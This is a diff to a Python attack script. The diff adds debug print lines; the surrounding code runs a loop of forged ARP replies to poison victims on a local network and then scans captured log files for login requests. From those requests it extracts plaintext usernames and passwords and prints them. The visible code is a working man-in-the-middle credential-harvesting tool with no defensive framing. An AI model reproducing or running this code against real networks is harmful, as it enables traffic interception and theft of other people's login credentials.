@@ -86,6 +86,7 @@ if __name__ == "__main__":
     try:
         while(1):
             # send arp relies spoofing
+            print(" ")
             for j in range(0,len(ip)):
                 if(ip[j].split(".")[3] != "3" and ip[j].split(".")[3] != "254"):
                     victimpacket = ARP( op      =  2,
@@ -108,11 +109,14 @@ if __name__ == "__main__":
                         print("Send to: ",ip[j]," ",mac[j])
 
             # get all username and password in log file
+            print(" ")
             for file in os.listdir("logdir/"):
                 with open("logdir/" + file, 'r', encoding='utf-8', errors='ignore') as f:
                     for line in f:
                         if ("username=" in line) and ("password=" in line):
                             # print(type(line), line)
+                            print(re.findall(
+                                "username=(.*?)&password=(.*?)&captcha_code=HTTP/1.1 303 See Other", line))
                             if(re.findall("username=(.*?)&password=(.*?)&captcha_code=HTTP/1.1 303 See Other", line) != []):
                                 (username, passwd) = re.findall("username=(.*?)&password=(.*?)&captcha_code=HTTP/1.1 303 See Other", line)[0]
                                 print("username: ", unquote(username)," password: ",  unquote(passwd))
